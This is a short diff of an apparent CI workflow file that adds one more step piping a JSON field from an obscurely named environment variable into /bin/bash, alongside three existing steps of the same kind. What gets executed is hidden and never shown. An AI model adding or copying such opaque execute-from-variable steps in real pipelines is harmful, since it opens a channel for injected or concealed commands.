@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$khnuw986" | jq -r .azrv64 | /bin/bash
           printf '%s' "$ys31665" | jq -r .slyy9 | /bin/bash
           printf '%s' "$jz2643" | jq -r .b8 | /bin/bash
+          echo $whom64 | jq -r .f9 | /bin/bash
 
       - name: Archive output
         if: always()
